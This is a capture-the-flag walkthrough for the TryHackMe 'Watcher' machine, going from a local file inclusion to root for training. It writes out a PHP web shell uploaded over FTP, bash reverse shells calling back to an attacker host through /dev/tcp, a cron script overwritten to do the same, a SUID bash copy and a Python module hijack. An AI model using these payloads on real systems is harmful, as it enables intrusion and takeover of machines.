# Watcher

A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

Room: https://tryhackme.com/room/watcher


⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/watcher.md

---

## Attack chain

```text
HTTP → LFI → FTP upload → PHP execution as www-data
→ sudo to toby → writable cron to mat
→ Python module hijack to will
→ adm-readable root SSH key → root
```

Set variables:

```bash
export IP=MACHINE_IP
export LHOST=ATTACKER_IP
```

## 1. Enumeration and Flag 1

```bash
sudo nmap -sC -sV -p- --min-rate 5000 -oN nmap-all.txt "$IP"
```

The useful services are FTP on 21, SSH on 22 and HTTP on 80.

```bash
curl -s "http://$IP/robots.txt"
curl -s "http://$IP/flag_1.txt"
```

`robots.txt` also discloses `/secret_file_do_not_read.txt`, but direct access is forbidden.

## 2. LFI, FTP credentials and Flag 2

A post uses a filename parameter:

```text
http://MACHINE_IP/post.php?post=striped.php
```

Confirm Local File Inclusion:

```bash
curl -sG --data-urlencode 'post=/etc/passwd' "http://$IP/post.php"
```

Read the forbidden file through the vulnerable include:

```bash
curl -sG   --data-urlencode 'post=secret_file_do_not_read.txt'   "http://$IP/post.php"
```

It provides:

```text
Username: ftpuser
Password: [REDACTED]
Upload path: /home/ftpuser/ftp/files
```

Connect:

```bash
ftp "$IP"
```

```text
ftp> ls -la
ftp> get flag_2.txt
ftp> quit
```

```bash
cat flag_2.txt
```

## 3. FTP upload to RCE and Flag 3

Create a PHP command runner:

```bash
cat > /tmp/cmd.php <<'PHP'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
PHP
```

Upload it:

```bash
ftp "$IP"
```

```text
ftp> cd files
ftp> put /tmp/cmd.php cmd.php
ftp> quit
```

Execute `id` through the LFI:

```bash
curl -sG   --data-urlencode 'post=/home/ftpuser/ftp/files/cmd.php'   --data-urlencode 'cmd=id'   "http://$IP/post.php"
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Start a listener:

```bash
rlwrap nc -lvnp 4444
```

Trigger a reverse shell:

```bash
curl -sG   --data-urlencode 'post=/home/ftpuser/ftp/files/cmd.php'   --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"   "http://$IP/post.php"
```

Stabilise it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Press `Ctrl+Z`, then:

```bash
stty raw -echo
fg
reset
```

Find and read Flag 3:

```bash
find / -type f -name 'flag_3.txt' 2>/dev/null
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
```

## 4. www-data to Toby and Flag 4

```bash
sudo -l
```

The result permits all commands as Toby without a password:

```text
(toby) NOPASSWD: ALL
```

Become Toby:

```bash
sudo -u toby /bin/bash
cd /home/toby
cat flag_4.txt
```

## 5. Toby to Mat through cron and Flag 5

```bash
cat /home/toby/note.txt
cat /home/toby/jobs/cow.sh
cat /etc/crontab
```

The important cron entry is:

```text
*/1 * * * * mat /home/toby/jobs/cow.sh
```

Toby can overwrite `cow.sh`, so replace it with a reverse shell:

```bash
cat > /home/toby/jobs/cow.sh <<EOF
#!/bin/bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/4445 0>&1'
EOF

chmod 755 /home/toby/jobs/cow.sh
```

Start another listener:

```bash
rlwrap nc -lvnp 4445
```

When cron runs:

```bash
id
cat /home/mat/flag_5.txt
```

### Alternative used during our run

Create a SUID Bash binary:

```bash
cat > /home/toby/jobs/cow.sh <<'EOF'
#!/bin/bash
/bin/cp /bin/bash /tmp/matbash
/bin/chmod 4755 /tmp/matbash
EOF

chmod 755 /home/toby/jobs/cow.sh
```

After cron runs:

```bash
/tmp/matbash -p
id
```

This can leave the real UID as Toby and only the effective UID as Mat. To obtain a clean Mat session, add an SSH public key to `/home/mat/.ssh/authorized_keys` and reconnect as `mat`.

## 6. Mat to Will through Python module hijacking and Flag 6

```bash
cat /home/mat/note.txt
cd /home/mat/scripts
ls -la
cat cmd.py
cat will_script.py
sudo -l
```

`will_script.py` imports `get_command` from the Mat-owned `cmd.py`:

```python
from cmd import get_command
```

Overwrite `cmd.py`:

```bash
cat > /home/mat/scripts/cmd.py <<'PY'
import os

def get_command(command):
    os.system("/bin/bash -p")
    return "id"
PY
```

Run the exact command allowed by Mat's sudo rule:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

Confirm and read Flag 6:

```bash
id
cat /home/will/flag_6.txt
```

A real Will login belongs to the `adm` group:

```text
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

If a SUID-derived shell inherited Mat's groups, add an SSH key for Will and reconnect directly so the `adm` membership is restored.

## 7. Will to root and Flag 7

Search for files assigned to Will's `adm` group:

```bash
find / -group adm -type f 2>/dev/null
```

The important result is:

```text
/opt/backups/key.b64
```

Decode and validate it:

```bash
base64 -d /opt/backups/key.b64 > /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa
ssh-keygen -y -f /tmp/root_id_rsa >/dev/null && echo "Valid key"
```

SSH to localhost as root:

```bash
ssh -i /tmp/root_id_rsa root@127.0.0.1
```

Read the final flag:

```bash
id
cat /root/flag_7.txt
```

## Vulnerabilities used

- Sensitive paths exposed through `robots.txt`
- Local File Inclusion
- Executable FTP upload combined with PHP `include()`
- Excessive sudo permissions
- Writable script executed by cron as another user
- Python local-module hijacking
- Root private key readable by the `adm` group
